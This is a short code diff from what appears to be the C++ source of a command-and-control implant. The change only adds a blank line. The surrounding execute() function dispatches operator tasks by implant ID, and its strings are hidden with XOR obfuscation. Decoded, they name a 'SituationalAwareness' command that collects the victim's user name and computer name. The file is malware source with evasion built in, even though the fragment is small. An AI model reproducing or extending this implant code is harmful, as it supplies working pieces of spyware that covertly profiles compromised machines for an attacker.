@@ -34,6 +34,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     if(command.compare(xor_string("{A\\]I\\AGFIDwi_IZMFM[[",0x28)) == 0){
 
         try{
+            
             json results_parse = GetAll();
             results.append(results_parse.at(xor_string("][MZfIEM",0x28)));
             results.append(results_parse.at(xor_string("KGEXfIEM",0x28)));
